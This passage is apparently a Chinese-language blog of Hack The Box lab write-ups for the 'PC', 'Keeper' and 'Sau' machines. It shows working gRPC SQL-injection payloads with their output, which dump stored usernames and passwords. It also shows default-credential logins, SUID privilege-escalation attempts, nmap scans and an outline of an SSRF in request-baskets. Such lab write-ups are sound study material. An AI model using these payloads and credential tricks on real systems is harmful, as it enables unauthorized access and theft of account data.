<p>If ‘list’ is indicated, the symbol (if present) should be a fully-qualified<br>service name. If present, all methods of that service are listed. If not<br>present, all exposed services are listed, or all services defined in protosets.</p>
<p>If ‘describe’ is indicated, the descriptor for the given symbol is shown. The<br>symbol should be a fully-qualified service, enum, or message name. If no symbol<br>is given then the descriptors for all exposed or known services are shown.</p>
<p>If neither verb is present, the symbol must be a fully-qualified method name in<br>‘service&#x2F;method’ or ‘service.method’ format. In this case, the request body will<br>be used to invoke the named method. If no body is given but one is required<br>(i.e. the method is unary or server-streaming), an empty instance of the<br>method’s request type will be sent.</p>
<p>The address will typically be in the form “host:port” where host can be an IP<br>address or a hostname and port is a numeric port or service name. If an IPv6<br>address is given, it must be surrounded by brackets, like “[2001:db8::1]”. For<br>Unix variants, if a -unix&#x3D;true flag is present, then the address must be the<br>path to the domain socket.</p>
<p>Available flags:<br>  -H value<br>        Additional headers in ‘name: value’ format. May specify more than one<br>        via multiple flags. These headers will also be included in reflection<br>        requests to a server.<br>  -allow-unknown-fields<br>        When true, the request contents, if ‘json’ format is used, allows<br>        unknown fields to be present. They will be ignored when parsing<br>        the request.<br>  -authority string<br>        The authoritative name of the remote server. This value is passed as the<br>        value of the “:authority” pseudo-header in the HTTP&#x2F;2 protocol. When TLS<br>        is used, this will also be used as the server name when verifying the<br>        server’s certificate. It defaults to the address that is provided in the<br>        positional arguments.<br>  -cacert string<br>        File containing trusted root certificates for verifying the server.<br>        Ignored if -insecure is specified.<br>  -cert string<br>        File containing client certificate (public key), to present to the<br>        server. Not valid with -plaintext option. Must also provide -key option.<br>  -connect-timeout float<br>        The maximum time, in seconds, to wait for connection to be established.<br>        Defaults to 10 seconds.<br>  -d string<br>        Data for request contents. If the value is ‘@’ then the request contents<br>        are read from stdin. For calls that accept a stream of requests, the<br>        contents should include all such request messages concatenated together<br>        (possibly delimited; see -format).<br>  -emit-defaults<br>        Emit default values for JSON-encoded responses.<br>  -expand-headers<br>        If set, headers may use ‘${NAME}’ syntax to reference environment<br>        variables. These will be expanded to the actual environment variable<br>        value before sending to the server. For example, if there is an<br>        environment variable defined like FOO&#x3D;bar, then a header of<br>        ‘key: ${FOO}’ would expand to ‘key: bar’. This applies to -H,<br>        -rpc-header, and -reflect-header options. No other expansion&#x2F;escaping is<br>        performed. This can be used to supply credentials&#x2F;secrets without having<br>        to put them in command-line arguments.<br>  -format string<br>        The format of request data. The allowed values are ‘json’ or ‘text’. For<br>        ‘json’, the input data must be in JSON format. Multiple request values<br>        may be concatenated (messages with a JSON representation other than<br>        object must be separated by whitespace, such as a newline). For ‘text’,<br>        the input data must be in the protobuf text format, in which case<br>        multiple request values must be separated by the “record separator”<br>        ASCII character: 0x1E. The stream should not end in a record separator.<br>        If it does, it will be interpreted as a final, blank message after the<br>        separator. (default “json”)<br>  -format-error<br>        When a non-zero status is returned, format the response using the<br>        value set by the -format flag .<br>  -help<br>        Print usage instructions and exit.<br>  -import-path value<br>        The path to a directory from which proto sources can be imported, for<br>        use with -proto flags. Multiple import paths can be configured by<br>        specifying multiple -import-path flags. Paths will be searched in the<br>        order given. If no import paths are given, all files (including all<br>        imports) must be provided as -proto flags, and grpcurl will attempt to<br>        resolve all import statements from the set of file names given.<br>  -insecure<br>        Skip server certificate and domain verification. (NOT SECURE!) Not<br>        valid with -plaintext option.<br>  -keepalive-time float<br>        If present, the maximum idle time in seconds, after which a keepalive<br>        probe is sent. If the connection remains idle and no keepalive response<br>        is received for this same period then the connection is closed and the<br>        operation fails.<br>  -key string<br>        File containing client private key, to present to the server. Not valid<br>        with -plaintext option. Must also provide -cert option.<br>  -max-msg-sz int<br>        The maximum encoded size of a response message, in bytes, that grpcurl<br>        will accept. If not specified, defaults to 4,194,304 (4 megabytes).<br>  -max-time float<br>        The maximum total time the operation can take, in seconds. This is<br>        useful for preventing batch jobs that use grpcurl from hanging due to<br>        slow or bad network links or due to incorrect stream method usage.<br>  -msg-template<br>        When describing messages, show a template of input data.<br>  -plaintext<br>        Use plain-text HTTP&#x2F;2 when connecting to server (no TLS).<br>  -proto value<br>        The name of a proto source file. Source files given will be used to<br>        determine the RPC schema instead of querying for it from the remote<br>        server via the gRPC reflection API. When set: the ‘list’ action lists<br>        the services found in the given files and their imports (vs. those<br>        exposed by the remote server), and the ‘describe’ action describes<br>        symbols found in the given files. May specify more than one via multiple<br>        -proto flags. Imports will be resolved using the given -import-path<br>        flags. Multiple proto files can be specified by specifying multiple<br>        -proto flags. It is an error to use both -protoset and -proto flags.<br>  -protoset value<br>        The name of a file containing an encoded FileDescriptorSet. This file’s<br>        contents will be used to determine the RPC schema instead of querying<br>        for it from the remote server via the gRPC reflection API. When set: the<br>        ‘list’ action lists the services found in the given descriptors (vs.<br>        those exposed by the remote server), and the ‘describe’ action describes<br>        symbols found in the given descriptors. May specify more than one via<br>        multiple -protoset flags. It is an error to use both -protoset and<br>        -proto flags.<br>  -protoset-out string<br>        The name of a file to be written that will contain a FileDescriptorSet<br>        proto. With the list and describe verbs, the listed or described<br>        elements and their transitive dependencies will be written to the named<br>        file if this option is given. When invoking an RPC and this option is<br>        given, the method being invoked and its transitive dependencies will be<br>        included in the output file.<br>  -reflect-header value<br>        Additional reflection headers in ‘name: value’ format. May specify more<br>        than one via multiple flags. These headers will <em>only</em> be used during<br>        reflection requests and will be excluded when invoking the requested RPC<br>        method.<br>  -rpc-header value<br>        Additional RPC headers in ‘name: value’ format. May specify more than<br>        one via multiple flags. These headers will <em>only</em> be used when invoking<br>        the requested RPC method. They are excluded from reflection requests.<br>  -servername string<br>        Override server name when validating TLS certificate. This flag is<br>        ignored if -plaintext or -insecure is used.<br>        NOTE: Prefer -authority. This flag may be removed in the future. It is<br>        an error to use both -authority and -servername (though this will be<br>        permitted if they are both set to the same value, to increase backwards<br>        compatibility with earlier releases that allowed both to be set).<br>  -unix<br>        Indicates that the server address is the path to a Unix domain socket.<br>  -use-reflection<br>        When true, server reflection will be used to determine the RPC schema.<br>        Defaults to true unless a -proto or -protoset option is provided. If<br>        -use-reflection is used in combination with a -proto or -protoset flag,<br>        the provided descriptor sources will be used in addition to server<br>        reflection to resolve messages and extensions.<br>  -user-agent string<br>        If set, the specified value will be added to the User-Agent header set<br>        by the grpc-go library.<br>  -v    Enable verbose output.<br>  -version<br>        Print version.<br>  -vv<br>        Enable very verbose output.</p>
</blockquote>
<p>&#x2F;&#x2F;list</p>
<blockquote>
<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext 10.10.11.214:50051 list<br>SimpleApp<br>grpc.reflection.v1alpha.ServerReflection</p>
</blockquote>
<p>&#x2F;&#x2F;describe查看</p>
<blockquote>
<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext 10.10.11.214:50051 describe SimpleApp<br>SimpleApp is a service:<br>service SimpleApp {<br>  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );<br>  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );<br>  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );<br>}</p>
</blockquote>
<p>&#x2F;&#x2F;查看注册请求方法</p>
<blockquote>
<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext 10.10.11.214:50051 describe .RegisterUserRequest<br>RegisterUserRequest is a message:<br>message RegisterUserRequest {<br>  string username &#x3D; 1;<br>  string password &#x3D; 2;<br>}</p>
</blockquote>
<p>&#x2F;&#x2F;注册一下</p>
<blockquote>
<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext -d ‘{“username”:”123”,”password”:”123”}’ 10.10.11.214:50051 SimpleApp.RegisterUser<br>{<br>  “message”: “username or password must be greater than 4”<br>}</p>
<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext -d ‘{“username”:”1234”,”password”:”1234”}’ 10.10.11.214:50051 SimpleApp.RegisterUser<br>{<br>  “message”: “Account created for user 1234!”<br>}</p>
</blockquote>
<p>&#x2F;&#x2F;登录</p>
<blockquote>
<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext  -v -d ‘{“username”:”1234”,”password”:”1234”}’ 10.10.11.214:50051 SimpleApp.LoginUser</p>
<p>&#x2F;&#x2F; -v是详细信息，后面有用的到的token</p>
<p>Resolved method descriptor:<br>rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );</p>
<p>Request metadata to send:<br>(empty)</p>
<p>Response headers received:<br>content-type: application&#x2F;grpc<br>grpc-accept-encoding: identity, deflate, gzip</p>
<p>Response contents:<br>{<br>  “message”: “Your id is 842.”<br>}</p>
<p>Response trailers received:<br>token: b’eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzNCIsImV4cCI6MTY4NzUxNjg1OH0.wCduAv88qr8Y4aqHASQAvSlMpdF73NnOM2m9EnaedHM’<br>Sent 1 request and received 1 response</p>
</blockquote>
<p>&#x2F;&#x2F;getinfo</p>
<blockquote>
<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext -d ‘{“id”:”728”}’ 10.10.11.214:50051 SimpleApp.getInfo<br>{<br>  “message”: “Authorization Error.Missing ‘token’ header”<br>}</p>
<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext -v -d ‘{“id”:”842”}’ -H “token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzNCIsImV4cCI6MTY4NzUxNjg1OH0.wCduAv88qr8Y4aqHASQAvSlMpdF73NnOM2m9EnaedHM” 10.10.11.214:50051 SimpleApp.getInfo</p>
<p>Resolved method descriptor:<br>rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );</p>
<p>Request metadata to send:<br>token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzNCIsImV4cCI6MTY4NzUxNjg1OH0.wCduAv88qr8Y4aqHASQAvSlMpdF73NnOM2m9EnaedHM</p>
<p>Response headers received:<br>content-type: application&#x2F;grpc<br>grpc-accept-encoding: identity, deflate, gzip</p>
<p>Response contents:<br>{<br>  “message”: “Will update soon.”<br>}</p>
<p>Response trailers received:<br>(empty)<br>Sent 1 request and received 1 response</p>
</blockquote>
<blockquote>
<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext -v -d ‘{“id”:”1’”}’ -H “token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzNCIsImV4cCI6MTY4NzUxNjg1OH0.wCduAv88qr8Y4aqHASQAvSlMpdF73NnOM2m9EnaedHM” 10.10.11.214:50051 SimpleApp.getInfo<br>dquote&gt; </p>
</blockquote>
<p>好，使用了go环境跑grpcui的大佬，是通过bp抓包，sqlmap得到，数据库是sqlite，密码为HereIsYourPassWord1431，用户名sau。</p>
<blockquote>
<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext -v -d ‘{“id”:”1 union select 1”}’ -H “token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzNCIsImV4cCI6MTY4NzUxNjg1OH0.wCduAv88qr8Y4aqHASQAvSlMpdF73NnOM2m9EnaedHM” 10.10.11.214:50051 SimpleApp.getInfo</p>
<p>Resolved method descriptor:<br>rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );</p>
<p>Request metadata to send:<br>token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzNCIsImV4cCI6MTY4NzUxNjg1OH0.wCduAv88qr8Y4aqHASQAvSlMpdF73NnOM2m9EnaedHM</p>
<p>Response headers received:<br>content-type: application&#x2F;grpc<br>grpc-accept-encoding: identity, deflate, gzip</p>
<p>Response contents:<br>{<br>  “message”: “1”<br>}</p>
<p>Response trailers received:<br>(empty)<br>Sent 1 request and received 1 response</p>
</blockquote>
<p>百度了下sqlite的语法</p>
<blockquote>
<p>SELECT type, name, tbl_name, rootpage, sql FROM sqlite_master WHERE type&#x3D;’table’;</p>
</blockquote>
<p><code>docker run fullstorydev/grpcurl -plaintext -v -d &#39;&#123;&quot;id&quot;:&quot;1 union select sql from sqlite_master where type=\&quot;table\&quot;&quot;&#125;&#39; -H &quot;token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzNCIsImV4cCI6MTY4NzUxNjg1OH0.wCduAv88qr8Y4aqHASQAvSlMpdF73NnOM2m9EnaedHM&quot; 10.10.11.214:50051 SimpleApp.getInfo</code></p>
<blockquote>
<p>…</p>
<p>Response contents:<br>{<br>  “message”: “CREATE TABLE &quot;accounts&quot; (\n\tusername TEXT UNIQUE,\n\tpassword TEXT\n)”<br>}</p>
</blockquote>
<p>有一个accounts表，字段为username和password</p>
<p><code>docker run fullstorydev/grpcurl -plaintext -v -d &#39;&#123;&quot;id&quot;:&quot;1 union select group_concat(username||\&quot;~\&quot;||password) from accounts&quot;&#125;&#39; -H &quot;token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzNCIsImV4cCI6MTY4NzUxNjg1OH0.wCduAv88qr8Y4aqHASQAvSlMpdF73NnOM2m9EnaedHM&quot; 10.10.11.214:50051 SimpleApp.getInfo</code></p>
<blockquote>
<p><code>||</code>符号通常用作字符串连接运算符，用于将两个字符串连接在一起。它在许多关系型数据库管理系统（包括SQLite）中都被广泛支持，跨数据库通用。用逗号这里貌似出错了。</p>
</blockquote>
<blockquote>
<p>Response contents:<br>{<br>  “message”: “admin<del>admin,sau</del>HereIsYourPassWord1431”<br>}</p>
</blockquote>
<h3 id="3-ssh连接-1"><a href="#3-ssh连接-1" class="headerlink" title="3.ssh连接"></a>3.ssh连接</h3><p> <code>ssh sau@10.10.11.214</code> </p>
<blockquote>
<p> cat user.txt</p>
</blockquote>
<h3 id="4-提权"><a href="#4-提权" class="headerlink" title="4.提权"></a>4.提权</h3><p>sudo -l提权</p>
<blockquote>
<p>sau@pc:~$ sudo -l<br>[sudo] password for sau:<br>Sorry, user sau may not run sudo on localhost.</p>
</blockquote>
<p>suid提权</p>
<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
<blockquote>
<p>用于查找具有 SetUID 权限的可执行文件</p>
<ul>
<li><p><code>find</code>：这是一个用于在文件系统中搜索文件和目录的命令。</p>
</li>
<li><p><code>/</code>：表示搜索的起始位置为根目录。</p>
</li>
<li><p><code>-perm -u=s</code>：这是<code>find</code>命令的选项之一。<code>-perm</code>用于匹配文件的权限，<code>-u=s</code>表示匹配具有 SetUID 权限的文件。</p>
</li>
<li><p><code>-type f</code>：这是<code>find</code>命令的另一个选项，指定要搜索的文件类型为普通文件。</p>
</li>
<li><p><code>2&gt;/dev/null</code>：将标准错误输出重定向到 <code>/dev/null</code>，这样可以隐藏权限错误信息。</p>
<p>通常，SetUID 权限用于以文件所有者的权限而不是执行者的权限来执行文件。</p>
</li>
</ul>
</blockquote>
<p>发现了一个**&#x2F;usr&#x2F;bin&#x2F;bash**</p>
<p><code>/usr/bin/bash -p</code></p>
<p>按理说这样就可以是root身份了。</p>
<p>奇怪，我还是没反应，whoami不是root。</p>
<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>搜索未知端口的服务入手。</p>
<h2 id="5-Keeper"><a href="#5-Keeper" class="headerlink" title="5.Keeper"></a>5.Keeper</h2><p>20230930 继续练习</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">端口扫描</span></span><br><span class="line">nmap -sT --min-rate 10000 -p- 10.10.11.227 -oA nmapscan/ports</span><br><span class="line"></span><br><span class="line">Warning: 10.10.11.227 giving up on port because retransmission cap hit (10).</span><br><span class="line">Nmap scan report for 10.10.11.227</span><br><span class="line">Host is up (0.36s latency).</span><br><span class="line">Not shown: 65397 closed tcp ports (conn-refused), 136 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">详细扫描</span></span><br><span class="line">nmap -sT -sV -sC -O -p22,80 10.10.11.227 -oA nmapscan/detail</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 3539d439404b1f6186dd7c37bb4b989e (ECDSA)</span><br><span class="line">|_  256 1ae972be8bb105d5effedd80d8efc066 (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 62.74 seconds</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">namp脚本扫描漏洞</span></span><br><span class="line">nmap --script=vuln -p22,80 10.10.11.227</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Pre-scan script results:</span><br><span class="line">| broadcast-avahi-dos: </span><br><span class="line">|   Discovered hosts:</span><br><span class="line">|     224.0.0.251</span><br><span class="line">|   After NULL UDP avahi packet DoS (CVE-2011-1002).</span><br><span class="line">|_  Hosts are all up (not vulnerable).</span><br><span class="line">Nmap scan report for 10.10.11.227</span><br><span class="line">Host is up (0.48s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line">| http-vuln-cve2011-3192: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Apache byterange filter DoS</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2011-3192  BID:49303</span><br><span class="line">|       The Apache web server is vulnerable to a denial of service attack when numerous</span><br><span class="line">|       overlapping byte ranges are requested.</span><br><span class="line">|     Disclosure date: 2011-08-19</span><br><span class="line">|     References:</span><br><span class="line">|       https://www.tenable.com/plugins/nessus/55976</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192</span><br><span class="line">|       https://www.securityfocus.com/bid/49303</span><br><span class="line">|_      https://seclists.org/fulldisclosure/2011/Aug/175</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>访问一下网页</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">To raise an IT support ticket, please visit tickets.keeper.htb/rt/</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://tickets.keeper.htb/rt/&quot;</span>&gt;</span>To raise an IT support ticket, please visit tickets.keeper.htb/rt/<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>好，这个超链接连不上</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br><span class="line">添加</span><br><span class="line">10.10.11.227 tickets.keeper.htb</span><br></pre></td></tr></table></figure>

<p>再访问下这个链接</p>
<p><img src="/../../../Typora/img111/image-20231004133948172.png"></p>
<p>搜索默认登录密码，request tracker default credentials</p>
<p><img src="/../../../Typora/img111/image-20231004134735271.png"></p>
<blockquote>
<p>root</p>
<p>password</p>
</blockquote>
<p><del>网页加载太慢了吧</del></p>
<p><img src="/../../../Typora/img111/image-20231004144029805.png"></p>
<p>进去后，里面有个Admin-&gt;Users-&gt;select</p>
<p>发现了Unix login：<code>xxxxxxxx</code></p>
<p>注释呢，有一个，它的密码为 <code>xxxxxx</code></p>
<h3 id="user"><a href="#user" class="headerlink" title="user"></a>user</h3><p>好好好</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh lnorgaad@keeper.htb</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">cat</span> user.txt</span></span><br></pre></td></tr></table></figure>

<h3 id="root"><a href="#root" class="headerlink" title="root"></a>root</h3><p>有另一个zip文件，解压一下</p>
<p>有一个keepassdumpfull.dmp文件和kdbx文件</p>
<p>电脑是真的带不动了，不搞了，后面也是利用了keepass的漏洞</p>
<h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><p>usr.txt过程是简单的默认账号密码，以及配置疏忽问题，不涉及技术层面，但也是很考察细心程度</p>
<h2 id="6-sau"><a href="#6-sau" class="headerlink" title="6.sau"></a>6.sau</h2><h3 id="user-1"><a href="#user-1" class="headerlink" title="user"></a>user</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">端口扫描</span></span><br><span class="line">nmap -sT --min-rate 10000 -p- 10.10.11.224 </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">PORT      STATE SERVICE</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">22/tcp    open  ssh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">55555/tcp open  unknown</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">详细扫描</span></span><br><span class="line">nmap -sT -sV -sC -O -p22,55555 10.10.11.224 -oA nmapscan/detail</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|_  256 b30c47fba2f212ccce0b58820e504336 (ED25519)</span><br><span class="line">55555/tcp open  unknown</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GenericLines: </span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Content-Type: text/plain; charset=utf-8</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Request</span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.0 302 Found</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Location: /web</span><br><span class="line">|     Date: Wed,..</span><br><span class="line">|     Content-Length: 27</span><br><span class="line">|_    href=&quot;/web&quot;&gt;Found&lt;/a&gt;.</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port55555-TCP:V=7.93%I=7%D=10/4%Time=651D0ABA%P=x86_64-pc-linux-gnu%r(G</span><br><span class="line">SF:etRequest,A2,&quot;HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html;\</span><br><span class="line">SF:x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Wed,\x2004\x20Oct\x20</span><br><span class="line">SF:2023\x2006:48:24\x20GMT\r\nContent-Length:\x2027\r\n\r\n&lt;a\x20href=\&quot;/w</span><br><span class="line">SF:eb\&quot;&gt;Found&lt;/a&gt;\.\n\n&quot;)%r(GenericLines,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Re</span><br><span class="line">SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x</span><br><span class="line">SF:20close\r\n\r\n400\x20Bad\x20Request&quot;);</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: WAP|phone</span><br><span class="line">Running: Linux 2.4.X|2.6.X, Sony Ericsson embedded</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.4.20 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:sonyericsson:u8i_vivaz</span><br><span class="line">OS details: Tomato 1.28 (Linux 2.4.20), Tomato firmware (Linux 2.6.22), Sony Ericsson U8i Vivaz mobile phone</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>好，这个55555端口，明显是web，访问一下该端口<del>，好慢啊</del></p>
<p><img src="/../../../Typora/img111/image-20231004171629847.png"></p>
<p>google一下 这个cms</p>
<p> <code>request-baskets | Version: 1.2.1</code> </p>
<p>这个服务版本，谷歌一下，存在ssrf漏洞(CVE-2023-27163)</p>
<p>该服务存在接口<code>/api/baskets/&#123;name&#125;</code>，<code>/baskets/&#123;name&#125;</code>，这里的name可以任意，这些接口会接收一个forward_url参数，而这个参数存在SSRF漏洞</p>
<p>把那个create一点，相当于post请求 &#x2F;api&#x2F;baskets&#x2F;{name}，再访问那个name</p>
<p><img src="/../../../Typora/img111/image-20231004205634256.png"></p>
<p><img src="/../../../Typora/img111/image-20231004205919236.png"></p>
<p>末尾出现：</p>
<blockquote>
<p>This basket is empty, send requests to <a target="_blank" rel="noopener" href="http://10.10.11.224:55555/pknrnet">http://10.10.11.224:55555/pknrnet</a> and they will appear here.</p>
</blockquote>
<p>我送请求了呀，有什么办法捏</p>
<p>好像Apply后也没有什么变化</p>
<p>看下wp</p>
